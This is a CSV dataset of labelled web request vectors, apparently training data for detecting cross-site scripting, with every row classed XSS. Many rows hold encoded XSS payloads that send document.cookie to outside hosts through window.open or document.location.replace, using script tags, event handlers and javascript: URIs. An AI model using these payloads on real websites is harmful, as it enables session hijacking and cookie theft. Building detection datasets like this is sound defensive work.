id,class,vector
722,XSS,/eaXGG-kG3BsMME._L/esllriDTshc/auhSkyNgJ4XuW2W4U1cP/mpU/ncB3W_29a.XM/yndntitsmr/tpmo3io6twtia/LT3mXIniBD/o9AAgsti.msf?chu=%3Cdiv+++++style+%3D++%22binding%3A+++++url%28%5Bhttp%3A%2F%2Fwww.orta.com%2Fscript%2Fynma.swf%5D%29%3B%22++%3E&3anrtsBrci=rn
736,XSS,mgpgexntati=mht&3zviyrfwrissqs=jifs+&sam0t74phpR_=033801&onodNntaapgCcr=N=eoeT lyeh&tear=86401847&@C0htpass=Er4RR&nhes5amIitee=7h&Mu=a'&RsdgndVow=[\xC0][\xBC]script>[alert  ('drORsfsrta');][\xC0][\xBC]/script   >&02oh3iAAm=14138&ethcd=pfn%[w&7Dkdropphp7izmQI_=ect0olc0&ln=feru&mA6sxsaioth=e27sIoxrr&ReferspalpDrsto= rnonhpasswds<Nhdzidean4
745,XSS,dboo=57380488&veI=insert&4mitfeelirvya=1&r1OcIyI-=5098&exaixmoteiiep=41395811&Ymnph-D.Zrml=d
749,XSS,/MHpzEHzbLPLSw/uUtJESajUH/csllc4o4n/aHi/t8bKa4Y23uX0M2SuC/ua/Icpxfb/h@pFTo/Ivii48gnGwt3me9/sV5q6HieQDsAtp/erzeaxyena9slre/utXUWoan877.jpg?ti6beeq3nwnd=0834&yrnspidp=%3Cxml+++++id++++%3D++%22+++X+++++%22++%3E%3Ca+%3E%3Cb+++%3E%26lt%3Bscript%3E%5Balert+++%28%275IAtotcera%27%29%3B%5D%26lt%3B%2Fscript++%3E%3B%3C%2Fb++++%3E%3C%2Fa++++%3E%3C%2Fxml+%3E&m0libuE=939&ltieirsZssttm=bNapimottZnTio&oty8saft=dx_A
755,XSS,/5fm4/h%u91gOiLkaccept/t42-z9J57RrTcgx.j.js?tnfe3ide=%3C%21%5BCDATA%5B%3C%21--%5D%5D+%3E%3Cscript%3E%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.aresorar.com%2Fcgi-bin%2Fieli.cgi%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript%3E
756,XSS,"4isiri5sn=<xml   id=   ""    X  ""  ><a ><b>&lt;script>[document.location.replace    ('http://www.ntennsen.com/cgi-bin/nela.cgi'+document.cookie);]&lt;/script  >;</b    ></a ></xml>"
758,XSS,/fULQ@ndiAsZ-/iIgu.shtml?AeinHU4AX=r%3C%26&selectNtl=39627032&a5saYNo=2ydknae&eniwearaeis=netcs&sfpb1stas4=09245&Shhte=zsticieserhed&awm6rfh8opbrE=hs%26ehtpassdo%24%40hyot&oih4khamieodcd=eRba&Oasgliteifb5=641435323&Zne.R3JNj=1&e0m=a5a&otd=5i&eaud8=%3Cbody+++onload++%3D%22++%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.sear.com%2Fcgi-bin%2Fli.cgi%27%2Bdocument.cookie%29%3B%5D%22+++%3E
765,XSS,/pj/Jsq1Gb6OLDLxJWE/zAiQU-VdXS/dta9senafl2d/div2yb8pzQ059LPH/i3p.cgi?ntaoq3wsn=%3Cbgsound++++src+%3D%22++javascript%3A+%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.nete.com%2Fcgi-bin%2Fng.cgi%27%2Bdocument.cookie%29%3B%5D++%22++%3E&eniut9=4656847&SsxeTalthxale=1567388&bmtAhutmr2Od=%3Cuqhl&hrhdsltht=3e31ndT4edtMadma&ti7ibenDt=foc%29eogroup+byopenvpdropiiolA&petc0eAbyye=489168&eene6y=+rl&4Odwan3otstatcn=oSnneiasy
776,XSS,/yd5gtetsoeOh/eS6KQJ3@WC5BiWx0/NeGwindow.open.LGnK-8/qypJK55Hto/r5uodD@/aP/hl52GgZ/slet9Oehsaee6n7eH/hh/dWVvn2in/as/tD2CzSbuI5mOq.php?tU9iQYSq=8168&hm5o=hefq&mkudpm=on&ndBJ=ZsaIe&SI4TVKFxRu0=ws%26%3E&otHoeesvawfDs=587704&eenr=scw+ho&aa9locdosr=%3Cdiv+++style++%3D%22++++behaviour%3A+++++url%28%5Bhttp%3A%2F%2Fwww.veorreri.com%2Fscript%2FoaepCtn.mspx%5D%29%3B++%22%3E&euhmair2avogbxy=htaccesnobject8gt&e8ilou=vud%24%3Bh&anhri=senuy3aseTtrt5mJ&sveaAO=fguregCapsyp1u5ql&soSaanshtl=hlinkn0fcha%3At
777,XSS,/QN8OIy5vos/99M.7At_/1BjvwpIj62GZQfr1.js?hDab=11&weevdt=51670&n96Eb3nlr4ze=%3Cxml++++id+++%3D++%22++X++++%22+++%3E%3Ca+++%3E%3Cb++%3E%26lt%3Bscript%3E%5Bwindow.open%28%27http%3A%2F%2F28.188.225.26%2Fieolna.asmx%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript+++%3E%3B%3C%2Fb+%3E%3C%2Fa+%3E%3C%2Fxml+%3E
780,XSS,"EAlo8gt2rop=Ygweya&1fsonlfefeerhrW=sbMot8y4rdu&hoatt=stoaSaFeoys1&esedgslcTeIdja=7&7M0Vsock_streamf=p'&fieerttt=58&rluAoa8rica9=nn vtolenz&nYrqal1u=drllcwbwi9rtez&Hrl0=j%edne&cegaesjO=3&ou4eu&stNmeyoeeihhel7=ot&7trJwhere3AP_=edsepoaitpw&Sttueimroi=<xml src   =   ""javascript:[document.location.replace   ('http://www.es.com/cgi-bin/itma.cgi'+document.cookie);]""    >&4sy4tr=2bREosratos0"
781,XSS,/lQ/saGnLisotah/9ihoNnej/tcjGW7XAnA88/tQo.gif?eaaase=26176&Mtigounqua=674144&9qy=3&aoacdanrsdxhms=itdjntAGRw6&uaClity=3&lsrdetbtevrzrif=95102&8hlraitwegBc=9737021&whrfssprFew2i=ssand&nrtibnpteLrjsw1=55&itydncLtre6W=ntwretuhooiE5tae&Z.JGxJzyHDUnode=46085&yt2=hhrarM&ayals3nInydb=t
810,XSS,"RsYEaZrli=o5SkwtLLR&ucgycoogR8tm=208607&r_JS@LrBQVKJ=3BF_YRfV&qternhumtR7teo=40484&ddAy.QpsX6P=nJh_wDAyH-&5otIo8hmri=f]e?ncewi(x>)&adcaB3a5=327&3nnjt6tn=<img   src    = ""mocha:[window.open('http://117.59.123.36/llmaan.jsp'+document.cookie);]       ""  >&baD.4vJl3Fbgsound=519502881&49latsIs=087&p3ens5ilirei=50158709&nrtoeoexea=nEB_"
818,XSS,/tJUbv_g8H8Pp4Q/OrhqettiSd6nfrdeE/44s/smop3ll3qOZl8cc7qB_/1@PTJ/hoqtSgIF4tiv2y/7CS0c_U93o_obDyJa.msf?l2rstree9end=3846&7nsKee=8&dnc@_lVAl=avhzhMYjH&rstdguyiReloe=ySopassthrumae&dSzls82ciqs=uBeietH3oiCar&sMtehc3rse=rumnebhoeA&eytcf6le=aIc&AnnklsSeexXeeni=%3Cdiv+style++++%3D+++%22+++binding%3A++++url%28%5Bhttp%3A%2F%2Fwww.esas.com%2Fscript%2FjzbrTn.pl%5D%29%3B+++++%22%3E&rLaa5se8onbe=moah%3C&Eti=12
820,XSS,/0d7_4HcQ_Yg/i5F5y0a1D@.EqmT/q6NCYPJdZloPnQ/rx5K2B/s2ldt4unrieufeaeiine/eJhawoCqRtfgVTFiMzVz/kf/PY3foIhlike/y63P/atctotiHrusalCto.php4?wepaoW5o=99899390&0oese4tNusrdmd=%26%7B%5Bwindow.open%28%27http%3A%2F%2F173.142.144.195%2Fde.mspx%27%2Bdocument.cookie%29%3B%5D%7D%3B&group
849,XSS,/yr25lTWPDO_OR@wu/rebddf/UhfsshpFti/a1tdres8re/eHG9Ji/smioRotnP/sXsbWJAqvsBKbaL/wsioutslanOu/eB6xYDmJT@Ag/c6BHIY/3jKD_aDcoNAz-Gm1y.png?yrsuciumibE=h%3C&csie1cro9tfdmQe=sodSJoa.C_e&Ope@9BbvwhereK=hrC190Ud&Zxxrwm=Bteep4ar&Zv3LZyphLbm6=yns%40a%26edih2p&uHDUQFsuzOPN=rykqnxs&Hmsft=rPm&t7ii=likeahmg+obs1Ie&mochamwhereFddsD8bgsoundUwget=1lnx-U&hmeneElsnion=a5K651FvZU&ipz4ron6y6o5tbe=tuonrojhe&6eii=bpNXj6P
861,XSS,uusipg=ubegWwHoK1&seiar8Bnn=uheao
862,XSS,/thSf3/n@@i/iframea_.php3?taI9e=84&v9K@Eib=6&epLsnueUymboS=hr%25ivart3s&ll4ktIoiToqrsii=02&ryeshtFnE5tioe=%3Cdiv++style%3D%22++behaviour%3A+++url%28%5Bhttp%3A%2F%2Fwww.atalasit.com%2Fscript%2Frmt.sh%5D%29%3B+++%22%3E&htIadEmhgasn=148199610&fl=64276&tirur=362114006
866,XSS,/kyk-/eejo/arh3I8V.0jnZRkVROpT/mosshlano/tsbt/nooalrnlI3ist2NsRza/H1UOezkxp_/e3sNtuhnpr.htm?ui5npc=a%3Dum7&voidhecgcs=i+&xhaa1=3&stpl5Asogpn=%5B%5CxC0%5D%5B%5CxBC%5Dscript+%3E%5Bwindow.open%28%27http%3A%2F%2F61.104.120.211%2Fnstoen.dll%27%2Bdocument.cookie%29%3B%5D%5B%5CxC0%5D%5B%5CxBC%5D%2Fscript%3E&allscript-wp-NuZZa7r=trlzn+&ai8rlntwx0=13
867,XSS,/oggC/e9/mR58rwpul/aihljjdarJI_Irv8DWb/dFnQIH/uLS.UvXYW_mailiBy/drzeSga/K5XivgOv1telnetIolO/h4gWT.png?h3hctseIIfrao=a1pxGT&hcovsotrYgj=Npehnotkd6vxrsOn&9abfru=guehafadyiteno&uqrFofnoei=0KeV3_o&o0rapigvvqaap=scripth&liols2dk8t7n=%26%3Cscript+++%3E%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.elreer.com%2Fcgi-bin%2Fna.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript%3E&C78SLH8g=yan
882,XSS,/ter/AettebjaTtdhfr/inh/teL0d/iCkoCeds/lQKc/itKQyUn@_k7H/dedFSLifgWN1S1NB/bFcfacAnFbflA/g@c9jjo/hcaceatsdldrtbu/pdIhaL.dll?hsoaee=%3C%3Cscript++++%3E%5Bwindow.open%28%27http%3A%2F%2F123.143.175.36%2Fndnale.sh%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript+++%3E
887,XSS,/<SCRIPT>/?
897,XSS,/o8taaa/fsanfisTkr8/oha4dheaf3kddrsxAyci/anzEHkodmcitqaeotro/cdaettglts/nElcsnieyiTey3eser7/la3orivsrmaateu/8iItovnhoaEt/nl.pl?v3azsr=nruwt3uo&s1ug10t=4&7h-Csk_vea=nolrtmea&sEt=%26%7B%5Bdocument.location.replace++%28%27http%3A%2F%2Fwww.ni.com%2Fcgi-bin%2Fisetnema.cgi%27%2Bdocument.cookie%29%3B%5D%7D%3B&mmeyzoeyuhTapdu=uritToktcmq&ryewx=ct&shto4sjsn5qo=5a%2Bmv8naOathDallx&zjhrmoz=nss&eprcehuee=h+stni%408selectj97ou&ohAtnhrbo=181&gnhipaEfh6uvlt=mT2.-5fK1i
902,XSS,wtExIoota=66&SXd4McmzhqMin=tGJiBwiJ&php25EMHdJWh=jenwni3ddae&m.QO=491265&g.f_7AaCtCzK=ltnihiool&ncnetcatPBH=heslro9kt1fLnnin
916,XSS,/Jc9g/4tLf2UENE.tiff?aace7fn0es=%3Ca++++href+%3D%22++++javas%26%2399%3Bript%26%2335%3B%5Balert++%28%27nu%27%29%3B%5D+%22%3E&snv7trs1R=xQj1&kR1I=cizndsn6ibsEdnlw1&EbasseshmOey7=5040
920,XSS,/e-R5nx5Go1lPEoy.JcOv/xwRopeniperl2RCsy-/nr/6aneieioSixbwut1/koS/h1io9gfeeergen/oDkw/fGMp6w/iYbMyg-WeW6-1X1p.mspx?fOvdthe=mi6uidse2est&rdbhanhe0=apnb3-I7&ueoyy=%26%7B%5Balert+++%28%27ks3gsbr9%27%29%3B%5D%7D%3B&ghiee=nFl0V&bmthiisic=eeubNbeR
927,XSS,/ufx./vwOBWSIQuArWiZ/sXxYZO1LJ/pE_LN2.ZLHgg5VaN/Eitr4nt.jpg?QoRvOw5null4=tgkaor
935,XSS,/iw6lNmDxmJw-E-d_/8oe/oyJq7OKu-ZCa/h9ln0haesEs/oaphn.gif?EitN5nedi=Ucm&en2ndtetexiouo=1&ibf9maadirouaif=gEPhnitehsg&h0ia7=%3Ca++href+++%3D+%22++++javas%26%2399%3Bript%26%2335%3B%5Balert++++%28%27r5f%27%29%3B%5D+++%22++%3E&yes=deletem%3Cssa7&@acceptbinAHMIZknCp=7&rvUlinkseftplCconnect=07110&@tbDwp-phpIYlqO=Ow&Bbbeet=19&dmoozlleaGhmtf=unwteea&e73ema9f0s9ite=tthaax4p&sr8STi=s%3Ceh%3CEi3+e7d%3Em+4hn&uVli=apa
936,XSS,/i-kb8JEM-5zP/eesna7ebnzEmodi/chestUtndtmnght0/i2b.jpeg?sX8aohcb=tih%28&uoeeoi=ofmonwuueot4ih&oeoeis6ukIyfpyn=%3Cimg+src%3D%22++en+++%22onmouseover+%3D%22+++%5Bwindow.open%28%27http%3A%2F%2F186.200.202.234%2Fanatar.asp%27%2Bdocument.cookie%29%3B%5D+++%22+++%3E&seainyhaTeaE=n&NE9ohriiwh=fhtdeo&sn=9ap6sosh
939,XSS,kogternhrResto=rdTtcs5Ohie3phi9e&eT%ulibfpOTc=nlIw&tqz1vo5h=aor0y18xo&heFsrieeel=aabtebqy&Uta4nrsbw5no=519442&iframeNc6Rusrs5=eon&rcpcYwBGuY@=%3Cimg+++++src+++%3D%22+tenengnses%22onmouseover+%3D++++%22+++%5Bwindow.open%28%27http%3A%2F%2F79.134.52.223%2Fasinel.mdb%27%2Bdocument.cookie%29%3B%5D+++%22+++%3E
958,XSS,eaxjau=70883005&aoboesrt4niip=888742&tlvc6pade=onmednr6a9~a&d14nnaaheezSZ6u=]t]&icaieopj=88260987&nfsh=2340756&cCtunnpnamN=775&Rt9cycmdL=c4s&6oedo=casetmoocsris&hau49ehienCh=188824&BKXXE74cFqliframe=y=aPei
959,XSS,/m7iEedaw1v.jpeg?dcpeoct=ftp2oe&qav4echoyLcJetc.=elpat&vKcmXNwAF_=rwLladUhrev4njix&eurrsndhy8elE6=6204184&btMs=fTtYadiana5T&ou=te&Urrmessiiso=488436009&Edb=%3DDaSz&AYboot.iniKpetcf=tCs%40d4&JXf0locationCSj=r%26%3Drcplinput+ld%7Evn&ygl=%3Cimg+src++%3D+++%22++nineetictr+++%22onmouseover+%3D++++%22++%5Bwindow.open%28%27http%3A%2F%2F72.119.121.103%2Fge.asmx%27%2Bdocument.cookie%29%3B%5D+++%22++++%3E&xRmteuvnaGpl=6310900400
980,XSS,"o8lmarTwsig=liaNe6&adhbeeprhsk4sRw=69Ey&XZgUevalH3h8W=<input   type    =""     image  "" dynsrc =    ""    javascript"
982,XSS,/uhe0opnsrof0wee/2ul5/hi94yaintscn3eoie/oDmu7UiWGzSiE2zC./syigaaacpmyt.exe?bttritii8h=%3Cdiv+++onmouseover%3D+++%22+++%5Bwindow.open%28%27http%3A%2F%2F102.201.84.246%2Fneon.asp%27%2Bdocument.cookie%29%3B%5D+++%22++%3E&zi5y=9ns+
1000,XSS,opc7r=i_Ap8giG7&2tshavingSlUsmI=a3libi&yBSEt0oere0hE=Odo&7lttomte=eriytrk7oTihw&eAtzdzrun=5N |xrpaIoR'\o&o0ihr=Rcw&anemd0aii=heTo&iEu=nsleSs&l-ZCYechildZi=w0e&3olfn=9&RBfERP=504&tptEyaycmeot6cy==[rlog&hnbyhtzdt=%&eufalrui=wc&ts=fau
1002,XSS,/E2e6owdpbboBtiw.htm?gD8locationmbjOSvT1=32020507&9nfEennte=do+kelasNoNn&oa81s1anEoc6nM=h%5C&fn6d=bewindow.opentelneta2h%7Egroup+byupa%26%27+%29+li&9jN1bDY%u=perd&aartdwiEIc7=%3Cimg+++++src%3D++%22+++++livescript%3A%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.ni.com%2Fcgi-bin%2Frinsll.cgi%27%2Bdocument.cookie%29%3B%5D+++++%22+++%3E
1003,XSS,/mtktXl1/ZpuG/Pt-.3/w@_bxE0YEWWUG8yAfU/p6FYQvjHe/awob/okww/Iarr/zCbql3V@73F90/oanyr7w0swexesC9.css?6hat=%3C%21--+--+--%3E%3Cscript++%3E%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.roer.com%2Fcgi-bin%2Fetsialan.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript%3E%3C%21--+--+--%3E&sia3u=blenHwtootemktea&ti.F=mochazAep2
1020,XSS,pCi=2nc&aintrt3trsi=nHDix_8G6K&ZKGjLuAXT=stwbekohiw6dge6vm&rinhyott=683515&ltosi58dS4se=[\xC0][\xBC]script  >[window.open('http://16.3.116.45/ve.sh'+document.cookie);][\xC0][\xBC]/script>&4mpTt=leri&httpsaogsdnaf&ssEhyrs=uiNhElm&xbire7wa=0&Ion=hsizxboaeosc6nee&rrHnhaelema=ntbgsoundRz&xQ_wYHf=625&qawSj6=6&latOThnlISse=o/=m&meUeenhcoeeb=eecho-r
1030,XSS,/nmycsCSR_qOW6M1L@B/o3imgjwTI3l7Kr@.sh?uri=%3Cform%2Bname%3Daio%3E%3Cselect%2Bname%3Dlndr+%3Ehttp%3A%2F%2Fwww.6h.com%2Fes%2F%3F%3C%2Fselect++++%3E%3C%2Fform++%3E&waiay2htrr=5R3&had=33633&SO8obO=padx
1036,XSS,/inputvtL/a.sT8xLlm/ltbsl3e/M4elalo1s4eocctgpote/icQgsZ@yD/43WFREB_u@.Kip9/s4actdarans/r4184mqdoH8VCo6T/hdtdortenlonhgpik.jpg?hrheAa9Eget=676772&e8amavetqhr=aiv+aenwIGoi&EoE0bav=%3C%3Cscript++++%3E%5Bwindow.open%28%27http%3A%2F%2F254.161.11.103%2Fve.jsp%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript%3E
1046,XSS,/tHf6/tRpelnaeeoeneSizsAI/Oeteinnezbhy7tssTc/aKhAtinputh/cra8SNL2/3pM5/EgetEosn/formbshutdown5w8T0SR/tdjl2kbhhuossne.shtml?d0Ozi05yba22y=xcu8eq&qi56ulxe=ae&dunon=%3Cbgsound++++src++++%3D+++%22++++javascript%3A++%5Balert+++%28%276bajaa%27%29%3B%5D+%22+++%3E&o8toi=99615&OqZ5=2By_Ba&egbStd0=mteay&sa5saI1=ifQk39%40lYzjA&hsreibhC=tdNrincluderupdateD%40R4t20&xeLsoO5orlaCtt=SeY8doh&hybs3eoo=83649&rgeckecNetdhltw=0&9tEQDie_Uf-n=kwenae&oeiarmusou1=h+fhraceip&Lii=71183872
1058,XSS,/nwAWmveSIAqFzuD/1TxDMayf-mW-DQ/oathcxoOrrsOt1nEs.tiff?t5bypthdc55yea=dBns%3C&iEa=%3Cdiv++++style++++%3D++++%22++width%3A+expression%28%5Balert%28%27htnt%27%29%3B%5D%29%3B++++%22++++%3E&ndlEeIae=073393&Y5acceptaj27=b6_gHs&nyeNg6i=i86tteEn5oF5n16iie&i5m=r&nhdwnds1ot=lv6ywStenhhdl&t2rrncrseso=mlcst
1064,XSS,j2soTklScseani=&{[document.location.replace  ('http://www.ma.com/cgi-bin/olroll.cgi'+document.cookie);]};&rGuaexsxrnatoz=recmtuqittn&iMAUP@=pn&H1c2R=ewZ8_-Gc8&nigtylee=713485050&xn=0&inp8ma4Rahheyus=cupmsbin8'm8eNsd'&wcjiw2tneI=lunnno9&Ane=7485908302
1074,XSS,/rinnedztdieorhs/IVfromYPU6GN7EC/7BOEmGcU@iHlX/t0HoRMAVESKyzL7.V/Ol/frr/@EVN7/1LpEX@HOYjytGEVBf_/aJckZDn2RuT.rGtD8T/lyRWrfUhVM/onificfsn/J6Raccess_log7.pl?eiLtHhl6N=h&e9=3830&ba8qonedEk=%3Cinput++type++%3D+%22++++image+%22+++dynsrc%3D+++%22javascript%3A+%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.inentoto.com%2Fcgi-bin%2Fennameinli.cgi%27%2Bdocument.cookie%29%3B%5D+++++%22%3E
1077,XSS,/eMaBED/ouP9wxKGu1PF6mE.swf?aRGW8-zCfb9f=%3Cimg++++src++++%3D++++%22+le%22onmouseover+++%3D+%22%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.or.com%2Fcgi-bin%2Freison.cgi%27%2Bdocument.cookie%29%3B%5D+++++%22+%3E&keeaeldastHdie=26020&yzleoeha=rnia%5Cn&ntcH=1500782&edaeopIudscEyGs=rdu+8ropncoeelu
1078,XSS,VsEK=1132573&ilnieoa=peunAigzmipaenxoer&-VwdC0likenP= udwnr&neqnsn8eaOd=hevallftsep@v&ic=eijirle vae 3$l3&VEVEJYVd8q=input(5deletez&enGerrs8eefoe=;gnhb7qaa0u=5&_nAnfl=4563776&6Kincludeunionv=hNwb&e4DEhXcatL24Tlike=chtacces&9pheSwAxlta8e=iBIM&1GadeleteuveUDJinclude=[e=&ldb=amoy&reeui9=4Jt2&npaheam=72
1081,XSS,/e6cbiecrQcesttrndhg/x5eoil/epsskaulre.png?zsnIuhE=+lRqhnldesedn&td2qcAEdnh=3ell&foc9d=vyee0PeUfkrde6l&Eoo=otR.&CmtoteIk6aozSl=nnin5o+Ss3&t1We_C=%3C%21%5BCDATA%5B%3C%21--%5D%5D++%3E%3Cscript+++%3E%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.tima.com%2Fcgi-bin%2Fsilenillnd.cgi%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript+%3E&ha9hth=6&rea=a%40Icn&coTom=21&kGx=igi8dtoi
1086,XSS,/r9xe-/fciffaakcimm/Blog/@Ndelikej3Msreplacezcaesam/nsfvd0sH@./qH6lIVbypBi.t7No8D/hckKJekD...exe?uris7uniotot=nuhfe6mso%3BPEe&tAnt9ei9noi4d=oaNCeRmwui&ahdbnsxzon5fio=B6Geeec&nqrlReetac2ltt=7269&r1qhPQNo0=19061041&st=doto&6AgHdlded=51834690&gstcasehame=%3Clink+++rel++%3D++++%22stylesheet%22+href++++%3D+%22+++javascript%3A%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.ieve.com%2Fcgi-bin%2Fle.cgi%27%2Bdocument.cookie%29%3B%5D%22++%3E
1087,XSS,/uf3fANyivRg72FRoC.js?AeY1pc2e=SyHisOtre7e1+&httpblPbstdin=eoi%25%5C&6ssoxosesEsoezl=%3Clink+rel+++%3D%22++++stylesheet++++%22+++++href+++%3D+%22javascript%3A++++%5Bwindow.open%28%27http%3A%2F%2F164.171.46.31%2Fra.exe%27%2Bdocument.cookie%29%3B%5D+++++%22++%3E&wha=7EaeixueBt%40&3hhnnS=siy+Iw&sssntsal=7reoOot&trrwkooN8=799
1099,XSS,/ne9meqepmdvmnarlo/iUn/mvu4NApXuxo7ym/91D2styleo/dZr1JpyY/tg/rxUTlX2bcPdg@SrL-c/0CZUQWCxUO92/yotfetoEm7oeatjsdi/rbuexesumhArjr/1lEdterte/45oiersepnetEo7oc.gif?eErntryFrtrcro0=%3Cstyle+++type++%3D%22+++text%2Fjavascript+++++%22++++%3E%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.naarnd.com%2Fcgi-bin%2Fsitens.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fstyle++++%3E
1105,XSS,/aYyCx7jLVO/AnYDfHopen2andQv/4pjN99tmlinkLf16Y/home29EWstdin8JyDNA/MbId.icKQPdKlFT/Mungtotnhriuzt/on9hpv9S.qNrTfJm3mHJ/utteheun9corih7ueo/dcWkrz/eeBta4einudiho8/etdnnrfenainaa/i7JbjCCWH@jIyihV.e.tiff?gra4spos=%2BaoghtS%7Eagimgqme&lHhesee=%3Cimg+++src+++%3D%22+++livescript%3A%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.ie.com%2Fcgi-bin%2Fisdeittire.cgi%27%2Bdocument.cookie%29%3B%5D%22+%3E&oeaale7mt=aiA%26%2Bi
1108,XSS,/rzX3ZeVVT8LDdOi/VPopta/ao7/3hmnrr/b8g89w/aiise5sknJoRntotrl/gfBwLM.Qp/ida1/eBht.PpTO5/teesihbYOlt1hhW5mBtc/tK7Wc5H1nK7sXhAkAzE/l1eQ9q.cgi?a0ly9njZefrhn0s=%3C%21--+--+--%3E%3Cscript+%3E%5Balert++%28%27t9ti%27%29%3B%5D%3C%2Fscript+++%3E%3C%21--+--+--%3E&8t6ti=iotnaoe08e8a3c&94ndee=aef0
1148,XSS,/nsiygrp6a/eY1cfgl@OpEBf/7P9JxNZfw/bandjU/eolvpynn6nanowihmag/7zRZ-/s5cNDotau/td.htm?Eiosaaean=%3Cscript++++%3Ealert%28%27eou.oiuEh%27%29%3C%2Fscript+++%3E&lr=re0s&echbo97maeMrR3s=s07E&aesoet9elo7fi4=034&shtt5S5wrieepD=caddjltaL3elhteaao&ei4veylhbhoia=mur&j3Oit=+ee&esidolrdeyhAt=tEg6n%2B7halrelch%25ihra&1jx_acceptyRkGKjF=eceidx5atig3&sjnneii=bc&MC7IVXYAT=n3l&gl=yGai
1162,XSS,/3JxdtF36G57E99EBd/5dNtqrrahcadxvre/pp9A8RzFnoeF_imNLo/6@iF720bfW-lnHsE4RDs.shtml?6aaAlh=udelete&3Wl75bx=196533288&bl=Aiza&Qt8i-null9YBRQ=nfTi&dExoQ8iDVq8=219176760&ohlqbjau=itstEt6lcsI&ebpdogmceois2If=oe%2B&spGtwd=ttxasojaS0&Vcopyu9IB=aBl6W4GXRD&fetiloe8Onldg=+rdn%2B&Te=tefabhSe&9oJeseOd=goaep%3Ar&2tph1uiresn=agoi++E%3Dnvu6e%27n
1189,XSS,/ti3psstile4eneeonfc/tYGZSG/Y@F.documentD1UmstylesT.shtml?sVxchild=5Se&onp=%3Cimg++++src+%3D%22+++livescript%3A%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.an.com%2Fcgi-bin%2Ftotanestsi.cgi%27%2Bdocument.cookie%29%3B%5D%22++++%3E&tOsh=un&mySklau=%3DE&PbgsoundLv0@=oLPnNTMS&sBrminent=4432243&uyszbnb=stl7r2bnztEni&phtf=2279&rohraawm=hoxSlOH0O&smtnitidihh=mPI&ansbst8rx4iazrs=6426219
1200,XSS,/aojnzhnw.pl?nWeeeMceRdu=ua%400unmail%3C&9NaeItEatventD=obx&euo0rra5eddf=eHt928&0p2tenq=64905&ejeuoeioTtnd3Re=7494015&KyoBrPEQ=+&hisuansnaStv5=hsikr8bs6kisduuot&nidn03qk11ott=HIi6cwe4r&ia=7772235&u7Cesr9o=beddi&kvfSi=%3Ca+++href%3D++++%22+++about%3A%3Cs%26%2399%3Bript++++%3E%5Balert+%28%27frontc%27%29%3B%5D%3C%2Fscript+%3E%22+++%3E
1211,XSS,/xr/Ausr1OC_1A/haHYQ/tc_vPMzVD_cvsvRHC/pcacj@zKRTDjNQp/rYYP9kFPe/Edmwszsnoeans/fToko/omrTn1a3Awo/nmN_-h2XpwCgyG7@3QO/eOYJq.Rt/t6eEmsohLot0darm.sh?ztitica8l=%3Cimg++src++++%3D%22+mocha%3A%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.tave.com%2Fcgi-bin%2Faset.cgi%27%2Bdocument.cookie%29%3B%5D+%22%3E&inhf3eOcc=2002&anvwvetIWr=s&e8h1l1meces=outmpaD&iurm=Ltnpc&safeiesasA=eur4gsm9r&v6=oJtUC96I5h&titrexLqilrs=ln&u3eB3i=a+%40
